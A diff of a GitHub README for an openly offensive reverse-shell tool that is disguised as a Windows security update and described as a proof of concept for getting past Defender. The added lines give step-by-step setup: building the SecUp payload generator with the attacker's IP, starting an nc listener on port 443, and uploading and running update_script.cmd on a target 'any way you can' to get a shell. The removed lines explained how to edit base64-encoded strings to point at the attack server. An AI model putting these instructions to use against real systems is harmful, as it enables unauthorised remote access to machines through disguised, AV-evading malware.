@@ -10,17 +10,25 @@ Just a simple Reverse Shell using a batch script to kick things off, after which
 
 YouTube video demonstration and explanation >>> https://youtu.be/BFVzmZXIbQk
 
-[!] The `WinSecurityUpdate` file needs to be edited BY YOU for this to work. <br>
-- You will need to decode the *base64* strings that request the `a1` and `r1` files. <br>
-- Then you will need to modify the IP addresses in the `a1` and `r1` decoded strings to YOUR ATTACK IP and re-encode with *base64*. <br>
-- Replace the old `a1` and `r1` strings with your modified version and save.
+Setup is simple.<br>
+1. Clone this repo<br>
+`git clone https://github.com/daniellowrie/update_script`
+2. Build `SecUp.go`<br>
+`go build SecUp.go`
+3. From terminal, run: ./SecUp <LHOST><br>
+`dlowrie@kali:~/Tools/update_script$ ./SecUp 192.168.1.200`
+4. Open another terminal, and start a Listener on port 443 (sudo if not root)<br>
+`sudo nc -vnlp 443`
+5. Back at the SecUp terminal<br>
+`Press ENTER to continue...`
+6. Upload and execute `update_script.cmd` to target any way you can<br>
+7. Shellz
+<P></P>
+If you don't want to build SecUp, then that's OK.<br>
+I've put a compiled binary for Linux users in the repo.<br>
+In that case you can skip step 2
 
-[!] The `r1` file also needs to be edited BY YOU to work. <br>
-- Simply open the `r1` file with your favorite text editor <br>
-- Modify the IP Address to reflect YOUR ATTACK SERVER IP <br>
-- Save!
- 
-
+<P></P>
 Going to work on building a better mousetrap as this was just a PoC at making something 'malicious' that could bypass Defender.
 <P></P>
 
